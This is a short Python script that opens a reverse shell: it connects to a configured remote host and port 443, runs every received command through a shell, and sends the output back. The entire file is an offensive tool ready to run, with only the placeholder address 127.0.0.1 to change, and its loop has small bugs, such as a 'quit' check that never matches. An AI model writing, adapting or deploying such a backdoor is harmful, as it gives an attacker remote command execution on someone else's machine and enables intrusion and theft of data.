# -*- coding: utf-8 -*-
import socket,subprocess,sys
def shell():
    RHOST = '127.0.0.1'
    RPORT = 443
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((RHOST, RPORT))
     
    while True:
        data = s.recv(1024)
        if data == 'quit':
            s.close()        
        else:
            comm = subprocess.Popen(str(data), shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
            STDOUT, STDERR = comm.communicate()
        s.send(STDOUT+STDERR)
    s.close()

shell()
